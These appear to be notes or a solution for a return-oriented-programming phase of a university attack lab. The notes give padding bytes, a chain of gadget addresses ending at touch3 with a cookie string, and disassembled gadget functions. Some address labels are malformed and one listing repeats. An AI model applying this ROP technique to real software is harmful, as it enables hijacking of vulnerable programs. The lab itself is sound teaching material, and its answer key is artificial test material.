31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 
0x0000000000401a06  // rsp -> rax  48 89 e0
adr 0x0x7ffffffbe860 : 0x00000000004019c5  // rax -> rdi  48 89 c7
adr 0x0x7ffffffbe868 : 0x00000000004019ab  // pop %rax    58
adr 0x : 0x0000000000000048  // offset 0x48 = 72  
adr 0x : 0x00000000004019dd  // eax -> edx  89 c2
adr 0x : 0x0000000000401a34  // edx -> ecx  89 d1
adr 0x : 0x0000000000401a13  // ecx -> esi  89 ce
adr 0x : 0x00000000004019d6  // leaq  (rdi, rsi, 1) rax  
adr 0x : 0x00000000004019c5  // rax -> rdi  48 89 c7
adr 0x : 0x00000000004018fa  // touch 3
0x7ffffffbe8a8: 35 39 62 39 39 37 66 61 00 // cookie string


0000000000401a03 <addval_190>:
  401a03:	8d 87 41 48 89 e0    	lea    -0x1f76b7bf(%rdi),%eax
  401a09:	c3   

00000000004019c3 <setval_426>:
  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
  4019c9:	c3                   	retq

00000000004019a7 <addval_219>:
  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
  4019ad:	c3                   	retq  

00000000004019db <getval_481>:
  4019db:	b8 5c 89 c2 90       	mov    $0x90c2895c,%eax
  4019e0:	c3                   	retq  

0000000000401a33 <getval_159>:
  401a33:	b8 89 d1 38 c9       	mov    $0xc938d189,%eax
  401a38:	c3                   	retq   

0000000000401a11 <addval_436>:
  401a11:	8d 87 89 ce 90 90    	lea    -0x6f6f3177(%rdi),%eax
  401a17:	c3                   	retq  

00000000004019d6 <add_xy>:
  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
  4019da:	c3                   	retq   

00000000004019c3 <setval_426>:
  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
  4019c9:	c3                   	retq   